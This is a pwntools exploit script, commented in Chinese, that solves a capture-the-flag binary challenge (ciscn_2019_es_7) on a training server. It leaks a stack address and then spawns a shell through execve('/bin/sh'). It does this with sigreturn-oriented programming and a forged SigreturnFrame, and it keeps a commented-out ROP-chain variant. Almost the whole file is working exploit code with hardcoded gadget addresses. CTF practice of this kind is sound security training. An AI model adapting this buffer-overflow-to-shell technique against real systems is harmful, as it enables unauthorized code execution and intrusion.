from pwn import *

# 这题跟 ciscn_s_3 差不多，具体讲解看 ciscn_s_3.py
# 这里直接用SROP做
r = remote('node5.buuoj.cn', 29769)
# r = process('ciscn_2019_es_7')
context.log_level = 'debug'

vul_addr = 0x4004ED
mov_rax_3b = 0x4004E2  # execve
mov_rax_0f = 0x4004DA  # sigreturn
pop_rdi = 0x4005a3
# pop_rsi_r15 = 0x4005a1
mov_rdx_r13 = 0x400580
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059A
ret = 0x4003a9
syscall = 0x400501

payload = b'A' * 0x10 + p64(vul_addr)
r.send(payload)
r.recv(0x20)
stack_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
buf_addr = stack_addr - 0x118  # 这里需要用patchelf远程调试查看实际偏移量
print(f"stack_addr: {hex(stack_addr)}")
print(f"buf_addr: {hex(buf_addr)}")

'''
# ====================================== 构造execve =====================================
# execve("/bin/sh",NULL,NULL)
# rax=59
# rdi='/bin/sh'
# rsi=0
# rdx=0
# syscall

payload2 = p64(ret) + b'/bin/sh\x00'
payload2 += p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(0) + p64(1) + p64(buf_addr) + p64(0) * 3
payload2 += p64(mov_rdx_r13)
payload2 += p64(0) * 6  # 又执行一遍 pop_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0)  # 多了一个 add rsp, 8
payload2 += p64(pop_rdi) + p64(buf_addr + 0x8)
payload2 += p64(mov_rax_3b) + p64(syscall)
r.send(payload2)
r.interactive()
'''

'''
# ==================================== sigreturn ===============================
    "/bin/sh"
    Signal Frame
    syscall
    sigreturn
需要有够大的空间来塞下整个 sigal frame
'''
context(os='linux', arch='amd64', log_level='debug')

sigret = SigreturnFrame()
sigret.rax = constants.SYS_execve
sigret.rdi = buf_addr
sigret.rsi = 0
sigret.rdx = 0
sigret.rip = syscall

payload3 = b'/bin/sh\x00' + b'B' * 8
payload3 += p64(mov_rax_0f) + p64(syscall) + bytes(sigret)
r.sendline(payload3)
r.interactive()
